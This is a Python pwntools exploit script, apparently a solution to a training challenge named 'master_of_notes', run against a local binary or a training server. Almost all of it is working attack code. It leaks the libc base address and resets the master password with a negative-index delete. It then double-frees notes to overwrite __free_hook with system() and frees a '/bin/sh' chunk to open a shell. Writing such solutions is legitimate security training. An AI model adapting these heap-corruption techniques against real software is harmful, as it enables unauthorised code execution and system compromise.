from pwn import *
import time
import subprocess
from functools import reduce

def bytes2int(data):
	return int(data, 16)

def int2bytes(num: int, adjust=8) -> bytes:
	return num.to_bytes((num.bit_length() + 7) // 8, byteorder='little', signed=True if num < 0 else False).ljust(adjust, b"\x00")

def any2bytes(datum, adjust=8):
	if isinstance(datum, str):
		return datum.encode()
	elif isinstance(datum, int):
		return int2bytes(datum, adjust)
	elif isinstance(datum, bytes):
		return datum
	else:
		raise TypeError("any2bytes: datum provided is neither str, int or bytes object")

def send(r, data, newline=True):
	result=b""
	if isinstance(data, list):
		for datum in data:
			result += any2bytes(datum)
	else:
		result = any2bytes(data)
	if newline:
		r.sendline(result)
	else:
		r.send(result)
	time.sleep(0.05)

def print_red(str):
	print("\033[91m" + str + "\033[0m")

def genbin(binary_name):
	command = f"genbin ~/challenges/playroom/shellcodes/{binary_name}"
	try:
		return bytes.fromhex(subprocess.check_output(command, shell=True, universal_newlines=True))
	except (subprocess.CalledProcessError, ValueError) as e:
		print(f"An exception occurred: {e}")
	exit(-1)

def rop_chain(chain):	
	for i in range(len(chain)):
		chain[i] = p64(chain[i])
	return reduce(lambda x, y: x + y, chain)

#I/O functions
def user_register(r, name, password):
	r.clean()
	send(r, "1")
	r.recvuntil(b"Name:")
	send(r, name, newline=False)
	r.recvuntil(b"Password:")
	send(r, password, newline=False)
	r.recvuntil(b"User created!")

def user_login(r, name, password):
	r.clean()
	send(r, "2")
	r.recvuntil(b"Name:")
	send(r, name, newline=False)
	r.recvuntil(b"Password:")
	send(r, password, newline=False)
	r.recvuntil(b"Logged")

def user_logout(r):
	r.clean()
	send(r, "5")
	r.recvuntil(b"Welcome")

def user_create_note(r, index, size):
	r.clean()
	send(r, "1")
	r.recvuntil(b"Index:")
	send(r, str(index))
	r.recvuntil(b"Note size")
	send(r, str(size))
	r.recvuntil(b"Note created")

def user_fill_note(r, index, content):
	r.clean()
	send(r, "2")
	r.recvuntil(b"Index:")
	send(r, str(index))
	r.recvuntil(b"Content:")
	send(r, content, newline=False)
	r.recvuntil(b"Note filled")

def user_print_notes(r):
	r.clean()
	send(r, "3")

def user_delete_note(r, index):
	r.clean()
	send(r, "4")
	r.recvuntil(b"Index:")
	send(r, str(index))	

def master_login(r, password):
	r.clean()
	send(r, "3")
	r.recvuntil(b"Password: ")
	send(r, password, newline=False)
	r.recvuntil(b"Welcome milord!")

def master_delete_note(r, index):
	r.clean()
	send(r, "2")
	r.recvuntil(b"Index: ")
	send(r, str(index))

def master_logout(r):
	r.clean()
	send(r, "3")

context.terminal = ['tmux', 'splitw', '-h']
#context.log_level = "warn"
logging.getLogger('pwnlib.elf').setLevel(logging.ERROR)

# breakpoints
b_main = 0xffff

one_gadget=0x00
if args["ONE_GADGET"]:
	one_gadget = int(args["ONE_GADGET"], 16)
if args["REMOTE"]:
	r = remote("bin.training.offdef.it", 4004)
elif args["GDB"]:
	r = gdb.debug("./master_of_notes", f"""
		# b *{b_main}
		unset env
		# set disable-randomization off
		set debuginfod enabled on
		c
		""")
else:	
	r = process("./master_of_notes")

LIBC = ELF("./libc-2.27.so")
#LIBC.symbols["__symol_name"]


# LIBC LEAK
time.sleep(0.5)
user_register(r, "Master of Notes", "casa")
user_login(r, "Master of Notes", "casa")
user_create_note(r, 0, 0x90)
user_print_notes(r)
r.recvuntil(b"Note: ")
LIBC.address = u64(r.recvline(keepends=False).ljust(8, b"\x00")) - 0x3ebca0
print("libc base:", hex(LIBC.address))

# MASTER PASSWORD MANOMISSION AND LOGIN
user_delete_note(r, -8) # <- resets the password of master to 0
user_logout(r)
master_login(r, b"\x00")

# FASTBIN ATTACK
master_delete_note(r, 0)
master_delete_note(r, 0)
master_logout(r)
user_login(r, "Master of Notes", "casa")
user_create_note(r, 1, 0x90)
user_fill_note(r, 1, LIBC.symbols["__free_hook"])
user_create_note(r, 2, 0x90)
user_create_note(r, 3, 0x90)
user_fill_note(r, 3, LIBC.symbols["system"])
user_fill_note(r, 2, "/bin/sh") 
user_delete_note(r, 2)



r.interactive()
#user_create_note(r, 1, 0xdd0) # fill completely the unused freed chunk
#user_fill_note(r, 1, "a"*0xdd0)


